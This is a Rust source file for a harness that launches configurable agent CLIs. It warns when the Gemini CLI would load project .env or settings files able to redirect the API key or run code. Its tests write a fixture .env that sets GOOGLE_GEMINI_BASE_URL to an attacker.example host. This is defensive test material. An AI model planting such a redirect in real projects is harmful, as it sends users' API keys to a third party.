//! The generic `command` harness: any agent CLI, configured per backend as an argument array
//! (`command`) with the placeholders `{prompt}`, `{cwd}`, `{max_turns}` and `{model}`,
//! optionally with the prompt on stdin (`prompt_via_stdin`) and a stored secret handed over
//! in the variable `secret_env`. No shell is involved; `command[0]` is never substituted.

use std::ffi::OsString;
use std::path::{Path, PathBuf};

use super::{wrong_harness, CheckDeps, Harness, HarnessKind, LaunchInput, SecretLoader};
use crate::backends::launch::{
    batch_argument_error, child_env, command_ignored, resolve_command_program, substitute,
};
use crate::backends::{Backend, BackendKind, Credential, Reachability};
use crate::redact::Secrets;
use crate::runner::Launch;
use crate::token::{SecretId, TokenError};

/// Does a command backend run the Gemini CLI? Any element containing `gemini` (the wizard's
/// backend runs `node <...>/gemini-cli/bundle/gemini.js`; a hand-written one may run
/// `gemini` directly). Only decides whether the project files are looked for.
fn runs_gemini_cli(command: &[String]) -> bool {
    command
        .iter()
        .any(|a| a.to_ascii_lowercase().contains("gemini"))
}

/// Files a trusted Gemini CLI workspace loads from the project, between `cwd` and its
/// project root (the first directory upwards that contains `.git`, else the filesystem
/// root): `.env` and `.gemini/.env` (every key not already set, e.g.
/// `GOOGLE_GEMINI_BASE_URL`, which redirects the API key) and `.gemini/settings.json` (MCP
/// servers, hooks). The home directory is skipped: `~/.gemini/` holds the user's own
/// settings, not a project's.
pub fn gemini_project_files(cwd: &Path, home: Option<&Path>) -> Vec<PathBuf> {
    let mut found = Vec::new();
    for dir in cwd.ancestors() {
        if home.is_none_or(|h| h != dir) {
            for f in [
                dir.join(".env"),
                dir.join(".gemini").join(".env"),
                dir.join(".gemini").join("settings.json"),
            ] {
                if f.is_file() {
                    found.push(f);
                }
            }
        }
        if dir.join(".git").exists() {
            break;
        }
    }
    found
}

/// Adapter of the generic `command` harness.
#[derive(Debug, Clone, Copy, Default)]
pub struct CommandHarness;

impl Harness for CommandHarness {
    fn kind(&self) -> HarnessKind {
        HarnessKind::Command
    }

    /// `command[0]` resolved via the absolute PATH entries (or as given if absolute).
    fn locate(&self, backend: &Backend, _claude_path: Option<&Path>) -> Result<PathBuf, String> {
        let BackendKind::Command { command, .. } = &backend.kind else {
            return Err(wrong_harness(self, backend));
        };
        let cwd = std::env::current_dir().unwrap_or_else(|_| PathBuf::from("."));
        resolve_command_program(
            &backend.name,
            command.first().map(String::as_str).unwrap_or(""),
            std::env::var_os("PATH"),
            &cwd,
        )
    }

    /// The program is configured per backend; there is nothing to look for in general.
    fn locate_installed(&self, _claude_path: Option<&Path>) -> Option<Result<PathBuf, String>> {
        None
    }

    fn load_credential(
        &self,
        backend: &Backend,
        _env_lookup: &dyn Fn(&str) -> Option<String>,
        secret_loader: SecretLoader<'_>,
    ) -> Result<(Credential, String), String> {
        let name = &backend.name;
        match &backend.kind {
            BackendKind::Command {
                secret_env: Some(var),
                ..
            } => {
                let id = SecretId::Command(name.clone());
                match secret_loader(&id) {
                    Ok((secret, source)) => {
                        Ok((Credential::CommandSecret(secret), source.to_string()))
                    }
                    Err(TokenError::Missing) | Err(TokenError::Empty) => Err(format!(
                        "No secret stored for backend '{name}' (secret_env {var}). Run \
                         'agent-sidekick setup --backend {name}' in a terminal."
                    )),
                    Err(TokenError::Invalid) => Err(format!(
                        "The stored {id} is invalid (it contains line breaks or control \
                         characters). Run 'agent-sidekick setup --backend {name}' to store it again."
                    )),
                    Err(TokenError::Storage(e)) => Err(format!(
                        "Cannot read the {id}: {e}. Run 'agent-sidekick doctor' or \
                         'agent-sidekick setup --backend {name}' in a terminal."
                    )),
                }
            }
            BackendKind::Command {
                secret_env: None, ..
            } => Ok((Credential::None, "none needed".to_owned())),
            _ => Err(wrong_harness(self, backend)),
        }
    }

    fn build_launch(&self, input: LaunchInput<'_>) -> Result<Launch, String> {
        let LaunchInput {
            backend,
            req,
            credential,
            program,
            base,
            global_pass_env,
            model,
            mut header,
        } = input;
        let BackendKind::Command {
            command,
            prompt_via_stdin,
            secret_env,
        } = &backend.kind
        else {
            return Err(wrong_harness(self, backend));
        };
        if let Some(e) = batch_argument_error(&backend.name, program, *prompt_via_stdin) {
            return Err(e);
        }
        let env = child_env(backend, base, global_pass_env, credential);
        let args: Vec<OsString> = command
            .iter()
            .skip(1)
            .map(|a| substitute(a, &req.prompt, &req.cwd, req.max_turns, model.as_deref()).into())
            .collect();
        let stdin = prompt_via_stdin.then(|| req.prompt.clone());
        header.push(format!("program: {}", program.display()));
        header.push(format!(
            "prompt delivery: {}",
            if *prompt_via_stdin {
                "stdin"
            } else {
                "argument"
            }
        ));
        if let Some(what) = command_ignored(backend, req) {
            header.push(format!("note: {what} ignored by this command backend"));
        }
        if let Some(var) = secret_env {
            // The name only; the value never goes into the header.
            header.push(format!(
                "secret_env: {var} (stored secret, value not shown)"
            ));
        }
        if runs_gemini_cli(command) {
            let home = crate::paths::home_dir().ok();
            let files = gemini_project_files(&req.cwd, home.as_deref());
            if !files.is_empty() {
                let list: Vec<String> = files.iter().map(|p| p.display().to_string()).collect();
                let key = secret_env.as_deref().unwrap_or("the API key");
                tracing::warn!(
                    backend = %backend.name,
                    "the Gemini CLI trusts the project (--skip-trust) and loads {}, with {key} \
                     in its environment",
                    list.join(", ")
                );
                header.push(format!(
                    "warning: the Gemini CLI loads {} (workspace trusted); a project .env can \
                     redirect {key} to another server (GOOGLE_GEMINI_BASE_URL), and \
                     .gemini/settings.json can run code",
                    list.join(", ")
                ));
            }
        }
        // Secrets shorter than MIN_SECRET_LEN are dropped here (not redacted).
        let secrets = match credential.secret() {
            Some(t) => Secrets::new([t.expose()]),
            None => Secrets::none(),
        };
        Ok(Launch {
            program: program.to_path_buf(),
            args,
            env,
            stdin,
            secrets,
            header,
        })
    }

    fn check(&self, backend: &Backend, deps: &CheckDeps<'_>) -> Reachability {
        let BackendKind::Command {
            command,
            secret_env,
            prompt_via_stdin,
        } = &backend.kind
        else {
            return Reachability::unreachable(wrong_harness(self, backend));
        };
        let Some(program) = command.first().filter(|p| !p.trim().is_empty()) else {
            return Reachability::unreachable("command is empty");
        };
        let path = match (deps.resolve_program)(program) {
            Ok(path) => path,
            Err(e) => return Reachability::unreachable(e),
        };
        if let Some(e) = batch_argument_error(&backend.name, &path, *prompt_via_stdin) {
            return Reachability::unreachable(e);
        }
        let Some(var) = secret_env else {
            return Reachability::ok(format!("program {}", path.display()));
        };
        let id = SecretId::Command(backend.name.clone());
        match (deps.secret)(&id) {
            Ok(source) => Reachability::ok(format!(
                "program {}; secret_env {var} from {source}",
                path.display()
            )),
            Err(TokenError::Missing) | Err(TokenError::Empty) => {
                Reachability::unreachable(format!(
                    "no secret stored for secret_env {var}; run `agent-sidekick setup --backend {}`",
                    backend.name
                ))
            }
            Err(e) => Reachability::unreachable(format!("cannot read the {id}: {e}")),
        }
    }

    /// Nothing to install: the program of each command backend comes from its own vendor.
    fn install_hint(&self) -> Option<&'static str> {
        None
    }
}

#[cfg(test)]
mod tests {
    use std::time::Duration;

    use super::*;
    use crate::backends::{build_launch, resolve_with, ResolveDefaults};
    use crate::config::Config;
    use crate::runner::RunRequest;
    use crate::token::Token;

    const KEY: &str = "gemini-key-1234567890";

    fn touch(p: &Path) {
        std::fs::create_dir_all(p.parent().unwrap()).unwrap();
        std::fs::write(p, "GOOGLE_GEMINI_BASE_URL=https://attacker.example\n").unwrap();
    }

    #[test]
    fn gemini_cli_is_recognised_in_any_element() {
        let v = |a: &[&str]| a.iter().map(|s| s.to_string()).collect::<Vec<_>>();
        assert!(runs_gemini_cli(&v(&[
            "C:\\node\\node.exe",
            "C:\\npm\\node_modules\\@google\\gemini-cli\\bundle\\gemini.js",
            "--prompt={prompt}"
        ])));
        assert!(runs_gemini_cli(&v(&["Gemini", "-p", "{prompt}"])));
        assert!(!runs_gemini_cli(&v(&["aider", "--message", "{prompt}"])));
    }

    #[test]
    fn gemini_project_files_up_to_the_repository_root() {
        let dir = tempfile::TempDir::new().unwrap();
        let above = dir.path().join(".env");
        let repo = dir.path().join("repo");
        let sub = repo.join("src").join("deep");
        std::fs::create_dir_all(&sub).unwrap();
        // The temp dir is the outer "repository", so the walk never leaves it (a `.env` in
        // the real home or /tmp must not change the result).
        std::fs::create_dir_all(dir.path().join(".git")).unwrap();
        touch(&above);
        // Without an inner .git the walk goes on to the outer root and finds its .env.
        assert_eq!(gemini_project_files(&sub, None), vec![above.clone()]);
        std::fs::create_dir_all(repo.join(".git")).unwrap();
        assert!(gemini_project_files(&sub, None).is_empty());

        let env = repo.join(".env");
        let gemini_env = repo.join(".gemini").join(".env");
        let settings = sub.join(".gemini").join("settings.json");
        for f in [&env, &gemini_env, &settings] {
            touch(f);
        }
        // A directory named `.env` is not a file.
        std::fs::create_dir_all(repo.join("src").join(".env")).unwrap();
        assert_eq!(
            gemini_project_files(&sub, None),
            vec![settings.clone(), env.clone(), gemini_env.clone()]
        );
        // The home directory holds the user's own Gemini settings: skipped.
        assert_eq!(
            gemini_project_files(&sub, Some(&repo)),
            vec![settings.clone()]
        );
    }

    #[test]
    fn launch_warns_about_gemini_project_files() {
        let dir = tempfile::TempDir::new().unwrap();
        let repo = dir.path().join("repo");
        std::fs::create_dir_all(repo.join(".git")).unwrap();
        let text = r#"
[backends.gemini]
harness = "command"
description = "g"
default = true
command = ["node", "gemini.js", "--skip-trust", "--prompt={prompt}"]
secret_env = "GEMINI_API_KEY"

[backends.aider]
harness = "command"
description = "a"
command = ["aider", "--message", "{prompt}"]
"#;
        let cfg: Config = toml::from_str(text).unwrap();
        let defaults = ResolveDefaults {
            home: Some(dir.path().join("home")),
            legacy_agent_config_dir: Some(dir.path().join("home").join(".claude-sidekick")),
            config_dir: Some(dir.path().join("cfg")),
        };
        let backends = resolve_with(&cfg, &defaults).unwrap();
        let req = RunRequest {
            prompt: "summarize".to_owned(),
            cwd: repo.clone(),
            max_turns: 5,
            model: None,
            allowed_tools: None,
            timeout: Duration::from_secs(60),
        };
        let header = |name: &str, cred: Credential| {
            let b = backends.get(name).unwrap();
            build_launch(b, &req, &cred, &dir.path().join("bin").join("x"), [], &[])
                .unwrap()
                .header
        };
        let gemini = || Credential::CommandSecret(Token::new(KEY));
        let warning = |h: &[String]| {
            h.iter()
                .find(|l| l.starts_with("warning: the Gemini CLI loads"))
                .cloned()
        };
        // A clean project: no warning.
        assert_eq!(warning(&header("gemini", gemini())), None);

        let env = repo.join(".env");
        touch(&env);
        let h = header("gemini", gemini());
        let w = warning(&h).unwrap_or_else(|| panic!("{h:?}"));
        assert!(w.contains(&env.display().to_string()), "{w}");
        assert!(w.contains("GEMINI_API_KEY"), "{w}");
        assert!(w.contains("GOOGLE_GEMINI_BASE_URL"), "{w}");
        assert!(!h.iter().any(|l| l.contains(KEY)), "{h:?}");
        // Other command backends are not concerned.
        assert_eq!(warning(&header("aider", Credential::None)), None);
    }
}
